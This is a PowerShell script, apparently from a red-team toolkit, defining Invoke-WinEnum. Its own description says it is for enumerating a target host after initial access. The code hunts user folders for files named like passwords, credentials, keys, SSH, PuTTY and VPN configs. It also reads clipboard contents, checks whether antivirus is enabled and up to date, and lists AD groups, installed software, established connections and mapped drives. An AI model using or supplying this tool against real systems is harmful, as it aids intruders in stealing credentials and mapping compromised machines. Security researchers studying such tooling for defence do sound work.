function Invoke-WinEnum{

    <#
    .SYNOPSIS
    Collects all revelant information about a host and the current user context.

    .DESCRIPTION
    After gaining initial access to a target host. It is recommended to gain situational awareness by enumerating the user and system. 

    .PARAMETER User
    Specify a user to enumerate. The default is the current user. 

    .PARAMETER keyword
    Specify a keyword to use in file searches. 

    .PARAMETER UserInfo
    Enumerate user information

    .PARAMETER SysInfo
    Enumerate system information of the current host

    .PARAMETER NetInfo
    Enumerate the current network
    
    .EXAMPLE
    Conduct all enumeration with a keyword for file searches. 
    
    Invoke-WinEnum -UserInfo keyword "putty" -SysInfo -NetInfo
    
    .EXAMPLE
    Conduct all enumeration with a username
    
    Invoke-WinEnum -User "sandersb" -UserInfo -SysInfo -NetInfo

    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$False,Position=1)]
        [string]$User,
        [Parameter(Mandatory=$False)]
        [string]$keyword,
        [Parameter(Mandatory=$False)]
        [switch]$UserInfo,
        [Parameter(Mandatory=$False)]
        [switch]$SysInfo,
        [Parameter(Mandatory=$False)]
        [switch]$NetInfo
    )


    If($UserInfo){
        if($User){
            "UserName: $User`n"
            $DomainUser = $User  
        }
        else{
             #If the username was not provided, 
            $DomainUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
            $UserName = $DomainUser.split('\')[-1]
            "UserName: $UserName`n"
            
        }

        "`n-------------------------------------`n"
        "AD Group Memberships"
        "`n-------------------------------------`n"
        #https://social.technet.microsoft.com/Forums/scriptcenter/en-US/c8001c25-edb5-44b2-ad07-37b39285995f/systemdirectoryservicesaccountmanagement-and-powershell?forum=ITCG
        Add-Type -AssemblyName System.DirectoryServices.AccountManagement
        #Load assembly to User Principal and principalContext .Net classes
        $dsclass = "System.DirectoryServices.AccountManagement"
        $dsclassUP = "$dsclass.userprincipal" -as [type] 
        $iType = "SamAccountName"
        $Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        #Get the current domain 
        $contextTypeDomain = New-object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Domain,$Domain.Name) 
        #Set the context to the current domain 
        $cName = $Domain.GetDirectoryEntry().distinguishedName
        #Get the distinguishedName for the domain 
        $usr = $dsclassUP::FindByIdentity($contextTypeDomain,$iType,$DomainUser)
        #Grab the user principal object for the domain.
        $usr.GetGroups() | foreach {$_.Name + "`n"}
        #Enumerate all groups the user is apart of
        
        
        "`n-------------------------------------`n"
        "Password Last changed"
        "`n-------------------------------------`n"

        $usr.LastPasswordSet + "`n"
            
        "`n-------------------------------------`n"
        "Last 5 files opened"
        "`n-------------------------------------`n"
            
        $LastOpenedFiles = Get-ChildItem -Path "C:\Users\$Username" -Recurse -Include @("*.txt","*.pdf","*.docx","*.doc","*.xls","*.ppt") -ea SilentlyContinue | Sort-Object {$_.LastAccessTime} | select -First 5 
        if($LastOpenedFiles){
            foreach ($file in $LastOpenedFiles){
                "Filepath: " + $file.FullName + "`n"
                "Last Accessed: " + $file.LastAccessTime + "`n"    
            }
        }
        
        "`n-------------------------------------`n"
        "Interesting Files"
        "`n-------------------------------------`n"
        #If the keyword is set, use it in the file search 
        if($keyword){
            $interestingFiles = Get-ChildItem -Path "C:\Users\$Username" -Recurse -Include @($keyword) -ea SilentlyContinue | where {$_.Mode.StartsWith('d') -eq $False} | Sort-Object {$_.LastAccessTime} 
            if($interestingFiles){
                foreach($file in $interestingFiles){
                    "Filepath: " + $file.FullName + "`n"
                    "Last Accessed: " + $file.LastAccessTime + "`n"
                }
            }
        }
        #Otherwise, search using the pre-defined list
        else{
             $interestingFiles = Get-ChildItem -Path "C:\Users\$Username" -Recurse -Include @("*pass*","*admin*","*config*","*cred*","*key*","*ssh*","*putty*","*vpn*") -ea SilentlyContinue | where {$_.Mode.StartsWith('d') -eq $False} 
             if($interestingFiles){
                 foreach($file in $interestingFiles){
                     "Filepath: " + $file.FullName + "`n"
                     "Last Accessed: " + $file.LastAccessTime + "`n"
                }
             }            
        }
        
        "`n-------------------------------------`n"
        "Clipboard Contents"
        "`n-------------------------------------`n"
        #http://www.bgreco.net/powershell/get-clipboard/
        
        $cmd = {
            Add-Type -Assembly PresentationCore
            [Windows.Clipboard]::GetText() -replace "`r", '' -split "`n"  
        }
        if([threading.thread]::CurrentThread.GetApartmentState() -eq 'MTA'){
            & powershell -Sta -Command $cmd
        }
        else{
            $cmd
        }
        "`n"
    }
      
    if($SysInfo){
        "`n-------------------------------------`n"
        "System Information"
        "`n-------------------------------------`n"
        #Grab the Windows Version and arch
        $OSVersion = (Get-WmiObject -class Win32_OperatingSystem).Caption
        $OSArch = (Get-WmiObject -class win32_operatingsystem).OSArchitecture
        "OS: $OSVersion $OSArch`n"
        
        If($OSArch -eq '64-bit'){
            $registeredAppsx64 = Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName | Sort-Object DisplayName
            $registeredApps = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName | Sort-Object DisplayName
            $registeredApps = $registeredApps + $registeredAppsx64
            $registeredApps = $registeredApps | Sort-Object DisplayName -Unique
            
        }
        else{
            $registeredApps =  Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName | Sort-Object DisplayName
        }

        "`n-------------------------------------`n"
        "AV Solution"
        "`n-------------------------------------`n"

        $AV = Get-WmiObject -namespace root\SecurityCenter2 -class Antivirusproduct 
        if($AV){
            $AV.DisplayName + "`n"
            #No documentation from MSDN 
            #Best resource found : http://neophob.com/2010/03/wmi-query-windows-securitycenter2/
            $AVstate = $AV.productState
            $statuscode = "{0:x6}" -f $AVstate
            $wscprovider = $statuscode[0,1]
            $wscscanner = $statuscode[2,3]
            $wscuptodate = $statuscode[4,5]
            $statuscode = -join $statuscode

            "AV Product State: " + $AV.productState + "`n"
            #check if the AV is enabled

            if($wscscanner -ge '10'){
                "Enabled: Yes`n"
            }
            elseif($wscscanner -eq '00' -or $wscscanner -eq '01'){
                "Enabled: No`n"
            }
            else{
                "Enabled: Unknown`n"
            }
            #Check if definitions are up to date
            if($wscuptodate -eq '00'){
                "Updated: Yes`n"
            }
            elseif($wscuptodate -eq '10'){
                "Updated: No`n"
            }
            else{
                "Updated: Unknown`n"
            }
        }
        
        "`n-------------------------------------`n"
        "Windows Last Updated"
        "`n-------------------------------------`n"
        $Lastupdate = Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object InstalledOn -First 1
        if($Lastupdate){
           $Lastupdate.InstalledOn | Out-String
           "`n"
        }
        else{
            "Unknown`n" 
        }    


    }

    #Coming soon
    if($NetInfo){
        "`n-------------------------------------`n"
        "Network Adapters"
        "`n-------------------------------------`n"
        #http://thesurlyadmin.com/2013/05/20/using-powershell-to-get-adapter-information/
        foreach ($Adapter in (Get-WmiObject -class win32_networkadapter -Filter "NetConnectionStatus='2'")){
            $config = Get-WmiObject -class win32_networkadapterconfiguration -Filter "Index = '$($Adapter.Index)'"
            "--------------------------`n"
            "Adapter: " + $Adapter.Name + "`n"
            "--------------------------`n"
            "IP Address: "
            if($config.IPAddress -is [system.array]){
                $config.IPAddress[0] + "`n"
            }
            else{
                $config.IPAddress + "`n"
            }
            "---------------------------`n"
            "Mac Address: " + $Config.MacAddress
            "---------------------------`n"

        }

        "`n-------------------------------------`n"
        "Netstat Established connections and processes"
        "`n-------------------------------------`n"
        #http://blogs.microsoft.co.il/scriptfanatic/2011/02/10/how-to-find-running-processes-and-their-port-number/

        $properties = 'Protocol','LocalAddress','LocalPort' 
        $properties += 'RemoteAddress','RemotePort','State','ProcessName','PID'

        netstat -ano | Select-String -Pattern '\s+(TCP|UDP)' | ForEach-Object {

            $item = $_.line.split(" ",[System.StringSplitOptions]::RemoveEmptyEntries)

            if($item[1] -notmatch '^\[::') 
            {            
                if (($la = $item[1] -as [ipaddress]).AddressFamily -eq 'InterNetworkV6') 
                { 
                    $localAddress = $la.IPAddressToString 
                    $localPort = $item[1].split('\]:')[-1] 
                } 
                else 
                { 
                    $localAddress = $item[1].split(':')[0] 
                    $localPort = $item[1].split(':')[-1] 
                } 

                if (($ra = $item[2] -as [ipaddress]).AddressFamily -eq 'InterNetworkV6') 
                { 
                    $remoteAddress = $ra.IPAddressToString 
                    $remotePort = $item[2].split('\]:')[-1] 
                } 
                else 
                { 
                    $remoteAddress = $item[2].split(':')[0] 
                    $remotePort = $item[2].split(':')[-1] 
                } 

                $netstat = New-Object PSObject -Property @{ 
                    PID = $item[-1] 
                    ProcessName = (Get-Process -Id $item[-1] -ErrorAction SilentlyContinue).Name 
                    Protocol = $item[0] 
                    LocalAddress = $localAddress 
                    LocalPort = $localPort 
                    RemoteAddress =$remoteAddress 
                    RemotePort = $remotePort 
                    State = if($item[0] -eq 'tcp') {$item[3]} else {$null} 
                }
                if($netstat.State -eq 'ESTABLISHED' ){
                    $netstat | Format-List ProcessName,LocalAddress,LocalPort,RemoteAddress,RemotePort,State | Out-String | % { $_.Trim() }
                    "`n`n"
                }
            }
        }
    

        "`n-------------------------------------`n"
        "Mapped Network Drives"
        "`n-------------------------------------`n"

        Get-WmiObject -class win32_logicaldisk | where-object {$_.DeviceType -eq 4} | ForEach-Object{
            $NetPath = $_.ProviderName
            $DriveLetter = $_.DeviceID
            $DriveName = $_.VolumeName
            $NetworkDrive = New-Object PSObject -Property @{
                Path = $NetPath
                Drive = $DriveLetter
                Name = $DriveName
            }
            $NetworkDrive
        }   
    }


}